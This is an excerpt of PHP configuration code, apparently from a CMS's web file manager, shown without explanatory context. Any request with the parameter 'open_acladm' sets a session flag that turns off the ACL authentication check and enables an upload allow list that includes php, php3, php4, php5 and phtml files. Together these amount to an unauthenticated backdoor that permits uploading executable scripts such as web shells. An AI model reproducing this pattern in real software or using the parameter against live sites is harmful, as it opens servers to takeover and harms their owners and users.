...
if (isset($_REQUEST['open_acladm'])){
	$_SESSION['__open_acladm']=true;
}
...
require('../../../../../../../core/classes/acl.class.php');

$aclAuth = true;
if (isset($_SESSION['__open_acladm'])){
	$aclAuth = false;
}
if ($aclAuth){
...
$cfg['url']	= 'media/files';
$cfg['root'] = '../../../../../../..' . DIR_SEP . $cfg['url'];			// http://www.yousite.com/upload/		absolute path
...
if (isset($_SESSION['__open_acladm'])){
	$cfg['deny'] = array(
		'file'		=> array('asp','aspx','ascx','jsp','cfm','cfc','pl','bat','exe','dll','reg','cgi'),
		'flash'		=> array(),
		'image'	=> array(),
		'media'	=> array(),
		'folder'	=> array(
	...
	$cfg['allow'] = array(
		'file'		=> array('php','php3','php4','php5','phtml','7z', 'aiff', 'asf', 'avi', 'bmp', 'csv', 'doc', 'fla', 'flv', 'gif', 'gz', 'gzip', 'jpeg', 'jpg', 'mid', 'mov', 'mp3', 'mp4', 'mpc', 'mpeg', 'mpg', 'ods', 'odt', 'pdf', 'png', 'ppt', 'pxd', 'qt', 'ram', 'rar', 'rm', 'rmi', 'rmvb', 'rtf', 'sdc', 'sitd', 'swf', 'sxc', 'sxw', 'tar', 'tgz', 'tif', 'tiff', 'txt', 'vsd', 'wav', 'wma', 'wmv', 'xls', 'xml', 'zip'),
		'flash'		=> array('swf', 'flv'),
